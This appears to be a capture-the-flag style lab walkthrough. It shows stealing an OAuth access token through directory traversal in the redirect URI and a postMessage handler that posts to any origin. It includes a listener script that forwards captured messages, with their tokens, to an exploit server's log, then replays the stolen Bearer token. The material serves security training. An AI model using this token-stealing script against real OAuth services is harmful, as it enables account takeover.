# test directory traversal is worked

![image](https://github.com/user-attachments/assets/adf26e7f-3614-4345-8fd2-e86ab1625c52)

# view page source to one of the posts

![image](https://github.com/user-attachments/assets/131a7235-2d27-4bc2-a087-038ebc09653e)

# click post/comment/comment-form

![image](https://github.com/user-attachments/assets/76e60e0b-c9f8-4f36-bf2f-fbf90ca87deb)


# The following script means it allows messages to every domain
```
       <script>
            parent.postMessage({type: 'onload', data: window.location.href}, '*')
            function submitForm(form, ev) {
                ev.preventDefault();
                const formData = new FormData(document.getElementById("comment-form"));
                const hashParams = new URLSearchParams(window.location.hash.substr(1));
                const o = {};
                formData.forEach((v, k) => o[k] = v);
                hashParams.forEach((v, k) => o[k] = v);
                parent.postMessage({type: 'oncomment', content: o}, '*');
                form.reset();
            }
        </script>

```
# copy url

![image](https://github.com/user-attachments/assets/ba0243a0-e244-482d-9d47-e41b9f18fbe0)

# in exploit server

![image](https://github.com/user-attachments/assets/305331c2-b4fb-4948-8db5-17f54f770574)

# you can use the following script to reveal the web message in the exploit server's access log:

```
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>

```

# Get access token

![image](https://github.com/user-attachments/assets/5934acdb-58fc-436c-be7a-376e2e51e763)

# Send that /me request from outh server to repeater

![image](https://github.com/user-attachments/assets/5f6961df-8744-4c31-a280-28849ac2e03c)

# replace the token in the Authorization: Bearer header with the one you just copied and send the request.

![image](https://github.com/user-attachments/assets/4520fa4f-e13e-4bc9-9564-e375277f2f3b)


